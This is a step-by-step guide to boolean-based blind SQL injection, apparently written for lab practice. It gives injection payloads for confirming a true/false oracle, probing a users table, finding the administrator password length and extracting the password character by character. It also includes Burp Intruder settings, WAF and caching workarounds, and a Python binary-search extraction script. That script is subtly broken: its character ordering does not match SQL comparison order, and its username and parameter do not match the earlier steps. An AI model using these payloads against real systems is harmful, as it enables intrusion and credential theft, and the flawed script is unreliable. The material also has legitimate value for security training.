# Boolean-Based Blind SQL Injection

## When this applies

- Application response varies between two states (e.g. "Welcome back" present/absent) based on injection of a boolean condition.
- No data is rendered, no errors are visible, but page content/length differs for true vs false.
- Often appears in cookies (`TrackingId`), search filters, or any parameter that affects a boolean check.

## Technique

Inject a condition that is logically equivalent to TRUE and another equivalent to FALSE, observe the difference, then extract data character-by-character with `SUBSTRING(...)='X'` style probes.

## Steps

### 1. Confirm boolean oracle

```
TrackingId=xyz' AND '1'='1
TrackingId=xyz' AND '1'='2
```

If `'1'='1'` returns the "true" state and `'1'='2'` returns the "false" state, you have a boolean oracle.

### 2. Confirm target table exists

```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

True response confirms `users` table is reachable.

### 3. Confirm row exists

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

### 4. Determine password length

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a
```

Iterate `>19`, `>20`, `=20` until you pin the length.

### 5. Extract characters with Burp Intruder

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```

**Burp Intruder configuration:**

- Attack type: Sniper
- Payload: `a-z`, `0-9` (extend with uppercase / specials if needed)
- Grep Match: the "true" indicator string (e.g. `Welcome back`)
- Iterate `SUBSTRING` position from 1 to length

### 6. Optimize with binary search

Sequential extraction = up to 36 requests/char. Binary search reduces to ~6/char:

```python
import requests, string, time

def binary_search_char(url, position):
    chars = string.ascii_lowercase + string.digits
    left, right = 0, len(chars) - 1
    while left <= right:
        mid = (left + right) // 2
        test_char = chars[mid]
        payload = f"' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')>'{test_char}"
        r = requests.get(url, params={'id': payload})
        if "Welcome back" in r.text:
            left = mid + 1
        else:
            right = mid - 1
    return chars[left]
```

### Database-specific substring syntax

| Database | Function |
|---|---|
| MySQL | `SUBSTRING(s,p,l)`, `MID(s,p,l)` |
| MSSQL | `SUBSTRING(s,p,l)` |
| PostgreSQL | `SUBSTRING(s,p,l)` |
| Oracle | `SUBSTR(s,p,l)` |

`LENGTH()` is universal except MSSQL which uses `LEN()`.

## Verifying success

- True payload yields the "true" indicator (e.g. `Welcome back`); false payload yields the "false" page.
- Length probe converges on a single value (e.g. `>19` true, `>20` false, `=20` true → length 20).
- Extracted password authenticates successfully against the login endpoint.

## Common pitfalls

- Wrong substring function for the DBMS produces no observable difference and looks like the injection failed.
- Whitespace-sensitive WAFs require URL-encoded space (`+` or `%20`) — use Burp's `Auto-encode` mode.
- Caching layers (CDN, app-level) can serve identical responses regardless of payload — vary harmless params or set cache-busting cookies.
- `Grep Match` must be a string that ONLY appears in the true response — a substring present in both will produce false positives.
- Threading on Burp Intruder must be sane: too many concurrent requests cause server-side rate-limiting and corrupt the oracle.

## Tools

- Burp Intruder (Sniper attack, Grep Match).
- sqlmap (`--technique=B`).
- Custom Python with `requests` + binary search.
